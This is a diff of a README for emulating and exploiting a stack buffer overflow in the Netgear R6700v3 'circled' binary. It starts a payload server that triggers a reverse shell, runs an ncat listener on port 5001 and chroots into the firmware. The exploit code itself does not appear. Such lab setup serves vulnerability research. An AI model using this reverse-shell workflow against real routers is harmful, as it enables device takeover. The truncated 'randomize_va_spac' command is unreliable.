@@ -1,6 +1,6 @@
 # Exploiting a Stack Buffer Overflow on the Netgear R6700v3
 ## 1. Setup
-### 1.1 Host
+### 1.1 Host System
 - Install the following dependencies:
   - git
   - binwalk (https://github.com/ReFirmLabs/binwalk)
@@ -31,31 +31,35 @@
   # Copy circled.sh script
   cp firmware/circled.sh $ROOTFS/circled.sh
   ```
-- Copy the directories `$ROOTFS/` and `server/` to an ARMHF guest system ((e.g. a *QEMU* ARMHF Debian VM))
-### 1.2 Guest: ARMHF
-- In the following, we assume that the variable $ROOTFS points to the copied firmware's root filesystem
-- Sart the HTTP server delivering our payloads:
+- Copy the directories `$ROOTFS/` and `server/` to an ARMHF guest system (e.g. a *QEMU* ARMHF Debian VM).
+### 1.2 ARMHF Guest System
+- In the following, we assume that the variable $ROOTFS points to the copied firmware's root filesystem.
+- Start the HTTP server delivering the payloads:
   ```
+  # Using the default payloads triggering a reverse shell (use `--cmd` for a custom stage 0 payload)
   python3 server/circled.server.py
   ```
-- In case you use the HTTP server with the default stage 0 payload, listen for the reverse shell on TCP/5001:
+- In case the HTTP server was started with the default stage 0 payload (i.e. without customizing `--cmd`), listen for the reverse shell coming in on TCP port 5001:
   ```
   server/bins/ncat -l -p 5001
   ```
-- Emulate the *circled* binary
-  - Configure conservative ASLR:
+- Emulate the vulnerable *circled* binary:
+  - Configure conservative ASLR as being used on the Netgear R6700v3:
     ```
     echo 1 | sudo tee /proc/sys/kernel/randomize_va_spac
     ```
-  - Chroot into the root filesystem
-    - `sudo mount -t proc /proc/ ./squashfs-root/proc/`
-    - `sudo mount -t sysfs /sys/ ./squashfs-root/sys/`
-    - `sudo mount -o bind /dev/ ./squashfs-root/dev/`
-    - `sudo chroot ./squashfs-root/ /bin/sh`
-    - `export SHELL=/bin/sh`
-  - Execute the `circled` binary:
+  - Chroot into the root filesystem:
     ```
-    ./circled.sh
+    sudo mount -t proc /proc/ $ROOTFS/proc/
+    sudo mount -t sysfs /sys/ $ROOTFS/sys/
+    sudo mount -o bind /dev/ $ROOTFS/dev/
+    sudo chroot $ROOTFS/ /bin/sh
+    ```
+  - Execute the *circled* binary:
+    ```
+    export SHELL=/bin/sh
+
+    # With GDB and therefore without ASRL (omit `--gdb` to run without GDB and with ASRL enabled)
     ./circled.sh --gdb
     ```
 ## 1. Individual Binary Emulation
